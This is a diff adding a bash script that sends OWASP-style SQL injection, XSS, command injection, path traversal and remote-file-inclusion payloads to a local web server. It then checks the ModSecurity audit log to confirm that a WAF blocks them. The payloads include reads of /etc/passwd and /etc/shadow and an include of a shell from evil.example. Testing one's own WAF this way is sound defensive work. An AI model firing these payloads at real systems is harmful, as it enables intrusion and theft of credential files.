@@ -1,0 +1,55 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+BASE_URL="http://127.0.0.1"
+
+echo "=== PRECHECK ==="
+curl -sS -o /dev/null -w "health: %{http_code}\n" "127.0.0.1/api/health"
+
+echo ""
+echo "=== OWASP SQL INJECTION POC ==="
+curl -sS -o /dev/null -w "%{http_code} | /?id=1' OR '1'='1--\n" "127.0.0.1/?id=1' OR '1'='1--"
+curl -sS -o /dev/null -w "%{http_code} | /?user=admin' UNION SELECT 1,2,3--\n" "127.0.0.1/?user=admin' UNION SELECT 1,2,3--"
+curl -sS -o /dev/null -w "%{http_code} | POST SQLi body\n" -X POST "127.0.0.1/" -H "Content-Type: application/x-www-form-urlencoded" --data "username=admin' OR 1=1--&password=test"
+
+echo ""
+echo "=== OWASP XSS POC ==="
+curl -sS -o /dev/null -w "%{http_code} | /?search=<script>alert(1)</script>\n" "127.0.0.1/?search=<script>alert(1)</script>"
+curl -sS -o /dev/null -w "%{http_code} | /?x=<img src=x onerror=alert(1)>\n" "127.0.0.1/?x=<img src=x onerror=alert(1)>"
+curl -sS -o /dev/null -w "%{http_code} | /?msg=<svg/onload=alert(document.domain)>\n" "127.0.0.1/?msg=<svg/onload=alert(document.domain)>"
+
+echo ""
+echo "=== OWASP COMMAND INJECTION POC ==="
+curl -sS -o /dev/null -w "%{http_code} | /?cmd=;cat /etc/passwd\n" "127.0.0.1/?cmd=;cat /etc/passwd"
+curl -sS -o /dev/null -w "%{http_code} | /?cmd=||id\n" "127.0.0.1/?cmd=||id"
+curl -sS -o /dev/null -w "%{http_code} | /?exec=$(uname -a)\n" "127.0.0.1/?exec=$(uname -a)"
+
+echo ""
+echo "=== OWASP PATH TRAVERSAL / LFI POC ==="
+curl -sS -o /dev/null -w "%{http_code} | /?file=../../../../etc/passwd\n" "127.0.0.1/?file=../../../../etc/passwd"
+curl -sS -o /dev/null -w "%{http_code} | /?page=..%2F..%2F..%2F..%2Fetc%2Fshadow\n" "127.0.0.1/?page=..%2F..%2F..%2F..%2Fetc%2Fshadow"
+curl -sS -o /dev/null -w "%{http_code} | /?template=..\\..\\..\\windows\\win.ini\n" "127.0.0.1/?template=..\\..\\..\\windows\\win.ini"
+
+echo ""
+echo "=== OWASP RFI POC ==="
+curl -sS -o /dev/null -w "%{http_code} | /?include=http://evil.example/shell.txt\n" "127.0.0.1/?include=http://evil.example/shell.txt"
+curl -sS -o /dev/null -w "%{http_code} | /?load=https://example.com/payload.php\n" "127.0.0.1/?load=https://example.com/payload.php"
+
+echo ""
+echo "=== PROTOCOL / HEADER ANOMALY POC ==="
+curl -sS -o /dev/null -w "%{http_code} | Numeric Host header\n" "127.0.0.1/" -H "Host: 127.0.0.1"
+curl -sS -o /dev/null -w "%{http_code} | Scanner User-Agent sqlmap\n" "127.0.0.1/" -H "User-Agent: sqlmap/1.9#stable"
+
+echo ""
+echo "=== MIXED CHAIN POC ==="
+curl -sS -o /dev/null -w "%{http_code} | mixed query payload\n" "127.0.0.1/?id=1%27%20OR%201=1--&xss=<script>alert(1)</script>&file=../../etc/passwd"
+curl -sS -o /dev/null -w "%{http_code} | mixed JSON body\n" -X POST "127.0.0.1/" -H "Content-Type: application/json" --data '{"username":"admin'"'"' OR 1=1--","comment":"<svg/onload=alert(1)>","path":"../../../../etc/passwd"}'
+
+echo ""
+echo "=== AUDIT LOG CHECK ==="
+echo "Gunakan command ini untuk lihat event block terbaru:"
+echo "sudo tail -n 80 /var/log/modsecurity/audit.log"
+echo "sudo grep -E \"942100|941|930|949110|Access denied\" /var/log/modsecurity/audit.log | tail -n 80"
+
+echo ""
+echo "SELESAI. Jika WAF aktif, banyak request di atas akan return 403 dan tercatat di audit.log"
